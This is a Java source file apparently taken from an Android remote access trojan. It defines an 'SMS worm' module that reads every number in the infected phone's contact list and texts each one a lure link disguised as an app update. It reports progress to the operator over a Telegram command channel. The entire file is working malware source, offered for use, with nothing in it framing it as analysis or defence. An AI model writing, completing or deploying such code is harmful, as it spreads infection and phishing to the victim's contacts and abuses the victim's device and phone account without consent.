package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import com.enterprise.rat.utils.TelegramApi;

public class SMSWormManager {
    private Context context;
    private volatile boolean running = false;

    public SMSWormManager(Context context) { this.context = context; }

    public void startWorm(String message, int delayMs) {
        if (running) { TelegramApi.sendMessage("⚠ Worm already running."); return; }
        running = true;
        final String finalMessage = (message != null && !message.isEmpty())
            ? message
            : "Hey, check this out: https://bit.ly/app-update";
        final int finalDelay = Math.max(delayMs, 500);

        new Thread(() -> {
            int sent = 0;
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (!running) break;
                    String number = cursor.getString(0);
                    try {
                        SmsManager.getDefault().sendTextMessage(number, null, finalMessage, null, null);
                        sent++;
                        Thread.sleep(finalDelay);
                    } catch (Exception e) {}
                } while (cursor.moveToNext());
                cursor.close();
            }
            TelegramApi.sendMessage("📲 SMS Worm: " + sent + " messages sent.");
            running = false;
        }).start();
        TelegramApi.sendMessage("📲 SMS Worm started. Sending to all contacts...");
    }

    public void stopWorm() {
        running = false;
        TelegramApi.sendMessage("📲 SMS Worm stopped.");
    }
}
